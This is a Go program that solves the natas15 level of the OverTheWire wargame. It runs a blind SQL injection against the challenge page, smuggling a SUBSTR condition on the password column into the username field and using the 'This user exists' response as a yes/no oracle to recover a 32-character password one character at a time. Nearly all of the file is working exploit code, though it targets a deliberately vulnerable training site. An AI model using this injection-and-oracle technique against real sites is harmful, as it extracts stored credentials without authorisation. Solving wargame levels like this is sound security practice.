// natas15 is a little program to discover a base64-encoded password using an oracle in the natas15 challenge page
package main

import (
	"errors"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"os"
	"strings"
)

const (
	// Stolen from golang.org/src/encoding/base64/base64.go as it is not exported
	b64Std = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
)

var (
	numHTTPReqs = 0
)

type oracleFn func(try string, pos int) (bool, error)

func crackEq(oraFn oracleFn, secretLen int) (string, error) {
	var gotSoFar, candidate string
	for i := 0; i < secretLen; i++ {
		for j := 0; j < len(b64Std); j++ {
			candidate = b64Std[j:j+1]
			eq, err := oraFn(gotSoFar + candidate, i)
			if err != nil {
				return "", err
			}
			if eq {
				fmt.Printf(".")
				gotSoFar += candidate
				break
			}
		}
		if len(gotSoFar) == secretLen {
			fmt.Printf("✔")
			return gotSoFar, nil
		}
	}
	fmt.Printf("❌")
	return "", errors.New("failed to crack the secret :(")
}

func natasSQLInjectionOracle(try string, pos int) (bool, error) {
	// Make HTTP request.  We specify:
	// - user/pass to access the natas15 challenge
	// - 'username' guess via which we perform the SQL injection

	// We then check the response for the presence of a particular string:
	// 'This user exists'.

	// SQL executed by the server-side PHP is:
	// $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";

	// We can inject a second condition to check the 'password' field of the 'users' table:
	// SELECT * from users where username="natas16" and substr(password, 0, n)="guess"

	query := fmt.Sprintf(`natas16" and SUBSTR(password COLLATE latin1_bin, 1, %d) = "%s`, pos+1, try)

	data := make(url.Values)
	data.Set("username", query)
	body := data.Encode()

	req, err := http.NewRequest("POST", "http://natas15.natas.labs.overthewire.org/index.php", strings.NewReader(body))
	if err != nil {
		return false, err
	}
	req.SetBasicAuth("natas15", "<redacted>")  // Complete challenge 14 first! :)
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return false, err
	}
	numHTTPReqs++
	defer resp.Body.Close()

	b, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return false, err
	}

	found := strings.Contains(string(b), "This user exists")
	return found, nil
}

func main() {
	fmt.Println("NaTaS15_cRaCx\n\n")
	cracked, err := crackEq(natasSQLInjectionOracle, 32)
	if err != nil {
		fmt.Println("Sadly we failed :(")
		os.Exit(1)
	}
	fmt.Printf("\n\nAfter %d HTTP requests, the password is [%v]\n", numHTTPReqs, cracked)
}
